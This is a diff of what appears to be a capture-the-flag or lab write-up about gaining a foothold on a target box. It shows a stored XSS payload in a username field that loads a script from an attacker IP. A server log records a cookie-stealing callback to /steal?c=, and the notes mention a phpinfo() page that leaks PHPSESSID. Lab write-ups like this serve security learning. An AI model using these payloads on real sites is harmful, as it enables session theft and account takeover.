@@ -139,6 +139,7 @@ Finished
 # FootHold
 
 ## TRY 1:
+
  - XSS Through Username : register an account with an XSS payload as the username
    ```
    <script src="http://<ip>/xss.js"></script>
@@ -155,14 +156,16 @@ Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 10.80.159.135 - - [05/Feb/2026 22:02:51] code 404, message File not found
 10.80.159.135 - - [05/Feb/2026 22:02:51] "GET /steal?c= HTTP/1.1" 404 -
 ```
-## Fail 1
-
+- Failed...
 
 - On Analyzing Futher More Got to Know That
     - The PHPSESSID the Http is set as TRUE , means we can steal the cookie directly
-  -On Further more Digging the thing out FOUND :
+  
+-On Further more Digging the thing out FOUND :
    - /harm/to/self/server_info.php endpoint, we see that phpinfo() prints out the session details, including the PHPSESSID cookie.
-      
+
+## TRY 2
+
 
 
 
